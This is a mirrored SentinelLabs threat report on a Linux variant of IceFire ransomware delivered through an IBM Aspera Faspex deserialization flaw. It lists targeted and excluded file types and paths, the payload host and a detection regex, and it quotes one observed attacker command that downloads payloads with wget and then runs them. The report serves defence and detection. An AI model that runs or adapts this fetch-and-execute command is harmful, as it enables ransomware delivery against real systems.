---
title: IceFire Ransomware Returns | Now Targeting Linux Enterprise Networks
url: https://buaq.net/go-152772.html
source: unSafe.sh - 不安全
date: 2023-03-10
fetch_date: 2025-10-04T09:05:27.216316
---

# IceFire Ransomware Returns | Now Targeting Linux Enterprise Networks

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/602790bcb4b151403b625e4b08b5f838.jpg)

IceFire Ransomware Returns | Now Targeting Linux Enterprise Networks

Executive SummaryIn recent weeks SentinelLabs observed novel Linux versions of IceFire ransomware
*2023-3-9 21:58:50
Author: [www.sentinelone.com(查看原文)](/jump-152772.htm)
阅读量:43
收藏*

---

## Executive Summary

* In recent weeks SentinelLabs observed novel Linux versions of IceFire ransomware being deployed within the enterprise network intrusions of several media and entertainment sector organizations worldwide.
* Currently observations indicate the attackers deployed the ransomware by exploiting CVE-2022-47986, a deserialization vulnerability in IBM Aspera Faspex file sharing software.
* The operators of the IceFire malware, who previously focused only on targeting Windows, have now expanded their focus to include Linux. This strategic shift is a significant move that aligns them with [other ransomware groups](https://www.sentinelone.com/labs/cl0p-ransomware-targets-linux-systems-with-flawed-encryption-decryptor-available/) who also target Linux systems.

## Background

SentinelLabs recently observed a novel Linux version of the IceFire ransomware being deployed in mid February against enterprise networks. The *iFire* file extension is associated with known reports of IceFire, a ransomware family noted [by MalwareHunterTeam](https://twitter.com/malwrhunterteam/status/1503484073406345224) in March 2022.

> Another new ransomware just appeared: IceFire.
>
> — MalwareHunterTeam (@malwrhunterteam) [March 14, 2022](https://twitter.com/malwrhunterteam/status/1503484073406345224?ref_src=twsrc%5Etfw)

Prior to this report, IceFire had only shown a [Windows-centric](https://www.sentinelone.com/anthology/icefire/) [focus](https://newsroom.nccgroup.com/news/ncc-group-monthly-threat-pulse-august-2022-454476). The attackers tactics are consistent with those of the ‘big-game hunting’ (BGH) ransomware families, which involve double extortion, targeting large enterprises, using numerous persistence mechanisms, and evading analysis by deleting log files. Previous reports indicate that IceFire targeted [technology](https://www.guidepointsecurity.com/blog/grit-ransomware-report-august-2022/) companies; SentinelLabs observed these recent attacks against organizations in the media and entertainment sector. IceFire has impacted victims in Turkey, Iran, Pakistan, and the United Arab Emirates, which are typically not a focus for organized ransomware actors.

## Technical Analysis

The IceFire Linux version (SHA-1: b676c38d5c309b64ab98c2cd82044891134a9973) is a 2.18 MB, 64-bit ELF binary compiled with gcc for AMD64 architecture. We tested the sample on Intel-based distributions of Ubuntu and Debian; IceFire ran successfully on both test systems.

In observed intrusions, the Linux version was deployed against CentOS hosts running a vulnerable version of IBM Aspera Faspex file server software. The system downloaded two payloads using wget and saves them to `/opt/aspera/faspex`:

`sh -c rm -f demo iFire && wget hxxp[://]159.65.217.216:8080/demo && wget hxxp[://]159.65.217.216:8080/{redacted_victim_server}/iFire && chmod +x demo && ./demo`

On execution, files are encrypted and renamed with the “.ifire” extension appended to the file name. IceFire then deletes itself by removing the binary, which is evident in the picture below.

![](https://www.sentinelone.com/wp-content/uploads/2023/03/ATEAM_DRAFT__IceFire_Ransomware_Returns__Targeting_Linux_Enterprise_Networks_-_Google_Docs.png)

The “.iFire” extension is appended to the file name. IceFire skipped the files with “.sh” and “.cfg” extensions.

![](https://www.sentinelone.com/wp-content/uploads/2023/03/ATEAM_DRAFT__IceFire_Ransomware_Returns__Targeting_Linux_Enterprise_Networks_-_Google_Docs-2.png)

A file with the CPP extension that was encrypted by IceFire

## Excluded Files & Folders

The sample contains data segment references to a list of file extensions. These extensions are excluded from encryption, as they pertain to executables, application or system functionality. In the case of .txt and .pid, encrypting these files potentially impedes the ransomware functionality.

`.cfg.o.sh.img.txt.xml.jar.pid.ini.pyc.a.so.run.env.cache.xmlb`

The following file extensions are targeted for encryption:

`.sample .pack .idx .bitmap .gzip .bundle .rev .war .7z .3ds .accdb .avhd .back .cer .ctl .cxx .dib .disk .dwg .fdb .jfif .jpe .kdbx .nrg .odc .odf .odg .odi .odm .odp .ora .ost .ova .ovf .p7b .p7c .pfx .pmf .ppt .qcow .rar .tar .tib .tiff .vbox .vcb .vdi .vfd .vhd .vhdx .vmc .vmdk .vmsd .vmtm .vsdx .vsv .work .xvd .vswp .nvram .vmxf .vmem .vmsn .vmss .wps .cad .mp4 .wmv .rm .aif .pdf .doc .docx .eml .msg .mail .rtf .vbs .c .cpp .cs .pptx .xls .xlsx`

IceFire ransomware doesn’t encrypt all files on Linux: it avoids encrypting certain paths, so that critical parts of the system are not encrypted and remain operational. In one observed infection, the /srv directory was encrypted, so these exclusions can be selectively overridden.

|  |  |
| --- | --- |
| **Folder** | **Description** |
| /boot | Data used at startup |
| /dev | Device files, drivers |
| /etc | System configuration files |
| /lib | Shared libraries used by applications or system for dynamically-linked functionality |
| /proc | Virtual filesystem used by Linux to store runtime system information like PIDs, mounted drives, system configuration, etc. |
| /srv | Web server directories |
| /sys | Interface to the kernel; similar to /proc |
| /usr | User-level binaries and static data |
| /var | Dynamic data, e.g. caches, databases |
| /run | System information, including PID files; cleared on each reboot |

During our analysis, the user profile directory at `/home/[user_name]/` saw the most encryption activity. IceFire targets user and shared directories (e.g., `/mnt`, `/media`, `/share`) for encryption; these are unprotected parts of the file system that do not require elevated privileges to write or modify.

Interestingly, several file sharing clients downloaded benign encrypted files after IceFire had encrypted the file server’s shared folders. Despite the attack on the server, clients were still able to download files from the encrypted server. This implies the IceFire developer made thoughtful choices in the excluded paths and file extensions.

## IceFire Linux Payload Delivery & Infrastructure

IceFire for Windows is delivered through [phishing messages and pivoting using post-exploitation frameworks](https://www.sentinelone.com/anthology/icefire/). The Linux variant is in its infancy, though our observations indicate it was deployed using an exploit for [CVE-2022-47986](https://nvd.nist.gov/vuln/detail/CVE-2022-47986), a recently patched vulnerability in IBM’s Aspera Faspex file sharing software.

IceFire payloads are hosted on a DigitalOcean droplet at 159.65.217.216 with the following URL format:

`hxxp[://]159.65.217.216:8080/(subdomain.domain.TLD|IP_Address)/iFire`

The following regular expression can be used to detect IceFire payload URLs. Consider wildcarding the Digital Ocean IP address in case the actors pivot to a new delivery IP or domain.

`http:\/\/159\.65\.217\.216:8080\/(([a-z]+\.){2}([a-z]+)|^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4})\/iFire`

Open-source intelligence platforms revealed a history of Aspera Faspex activity on IP address 159.65.217.216, including:

* Other payload URLs with “aspera” in the secondary hostname section of the URI
* Session cookie name: \_aspera\_faspex\_session
* Service fingerprinting indexed a vulnerable version of Aspera Faspex softwar...